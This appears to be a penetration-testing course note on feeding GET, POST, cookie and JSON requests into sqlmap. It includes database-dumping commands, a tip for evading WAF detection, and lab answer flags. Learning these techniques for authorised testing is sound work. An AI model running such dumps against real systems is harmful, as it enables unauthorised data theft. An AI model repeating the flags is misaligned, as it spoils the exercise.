# NOTE — Running SQLMap on an HTTP Request

## ID
400

## Module
SQLMap Essentials

## Kind
notes

## Title
Section 4 — Running SQLMap on an HTTP Request

## Description
Covers how to feed different HTTP request types into SQLMap — GET params, POST data, custom headers/cookies, JSON bodies, and full request files captured from Burp or browser DevTools.

## Tags
sqlmap, sqli, post-data, cookie-injection, json-injection, burp-request

## Commands
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>' --data '<PARAM>=<VALUE>' --batch --dump
- sqlmap -u 'http://<TARGET>:<PORT>/<PAGE>' -H 'Cookie: <PARAM>=*' --batch --dump
- sqlmap -r <REQUEST_FILE> --batch --dump
- sqlmap '<CURL_COMMAND_PASTE>' --batch
- sqlmap -u '<URL>' --cookie='<COOKIE_NAME>=<VALUE>'
- sqlmap -u '<URL>' --data '<PARAM>=<VALUE>' --method PUT
- sqlmap -u '<URL>' --random-agent --batch

## What This Section Covers
SQLMap needs a well-formed HTTP request to test for SQL injection. This section teaches how to handle POST parameters (`--data`), cookie-based injection (`-H 'Cookie: id=*'`), JSON bodies (via `--data` or `-r`), and full request files captured from Burp or browser DevTools (`-r req.txt`). Incorrect request setup is one of the most common reasons SQLMap fails to detect a valid SQLi.

## Methodology

1. **Identify the injection point** — visit the target page and determine where the parameter lives: URL query string (GET), form body (POST), cookie header, or JSON payload.

2. **GET parameters** — simplest case, just pass the URL directly:
   `sqlmap -u 'http://<TARGET>:<PORT>/page.php?id=1' --batch --dump`

3. **POST form data** — use `--data` to supply the POST body. SQLMap will test every parameter in it:
   `sqlmap -u 'http://<TARGET>:<PORT>/case2.php' --data 'id=1' --batch --dump`

4. **Cookie-based injection** — mark the injectable cookie value with `*` so SQLMap knows to test it:
   `sqlmap -u 'http://<TARGET>:<PORT>/case3.php' -H 'Cookie: id=*' --batch --dump`

5. **JSON body** — for pages that send JSON (e.g. `{"id":1}`), you have two options:
   - **Short JSON:** use `--data '{"id":1}'` — SQLMap auto-detects JSON format
   - **Complex JSON / many headers:** capture the full request into a file and use `-r req.txt`

6. **Capture a full request file** — open browser DevTools (Ctrl+Shift+E) → Network tab → refresh the page → click the POST request → on the right panel scroll to "Request Headers" and switch to **Raw**, copy those headers → then click the **Request** tab, switch to **Raw**, and copy the body → paste both into a `.txt` file (headers first, blank line, then body):
   ```
   POST /case4.php HTTP/1.1
   Host: <TARGET>:<PORT>
   Content-Type: application/json
   <other headers>

   {"id":1}
   ```
   Then run: `sqlmap -r req.txt --batch --dump`

7. **Narrow testing to a specific parameter** — if you know which param is vulnerable, use `-p <PARAM>` to skip testing the others, or mark it with `*` in the data string (e.g. `'uid=1*&name=test'`).

8. **Avoid detection** — use `--random-agent` to replace SQLMap's default User-Agent string, which many WAFs and IDS systems fingerprint and block.

## Lab — Questions & Answers

| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Contents of table flag2? (Case #2) | `HTB{700_much_c0n6r475_0n_p057_r3qu357}` | POST injection: `sqlmap -u 'http://<TARGET>:<PORT>/case2.php' --data 'id=1' --batch --dump` |
| Q2 — Contents of table flag3? (Case #3) | `HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475}` | Cookie injection: `sqlmap -u 'http://<TARGET>:<PORT>/case3.php' -H 'Cookie: id=*' --batch --dump` |
| Q3 — Contents of table flag4? (Case #4) | `HTB{j450n_v00rh335_53nd5_6r475}` | JSON body via request file: open DevTools → Network tab → click the POST to `case4.php` → copy raw Request Headers + raw Request body into `req.txt`, then `sqlmap -r req.txt --batch --dump` |

## Key Takeaways
- The `*` marker is how you tell SQLMap to inject into non-standard locations (cookies, headers, specific params in a multi-param string). Without it, SQLMap won't test those spots.
- `--data` handles both traditional form POST (`id=1`) and JSON (`{"id":1}`) — SQLMap auto-detects the format.
- For complex requests (many custom headers, auth tokens, JSON bodies), always use `-r` with a captured request file — it's less error-prone than building a long command line.
- Browser DevTools "Copy as cURL" → paste and replace `curl` with `sqlmap` is the fastest workflow for real-world targets.
- `--random-agent` should be habitual — SQLMap's default UA is a well-known signature that gets blocked.
- `--batch` auto-accepts all prompts with defaults — great for labs, but in real engagements review the prompts manually so you don't miss important decisions.

## Gotchas
- **Forgetting the `*` on cookie injection** — without it, SQLMap treats the cookie as a static value and never tests it. You'll get zero results and waste time.
- **JSON content-type mismatch** — if you use `--data '{"id":1}'` but the server expects `Content-Type: application/json`, SQLMap may send it as form-data. Using `-r` with the full request avoids this entirely.
- **Request file formatting** — the blank line between headers and body is mandatory in the `-r` file. Missing it = SQLMap treats the body as a header and nothing works.
- **Copy as cURL quirks** — some browsers add `--compressed` or other curl-specific flags that SQLMap doesn't understand. Remove them if SQLMap throws errors.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|sqlmap-fundamentals]]  
← [[03-output-description]] | [[05-handling-errors]] →
<!-- AUTO-LINKS-END -->
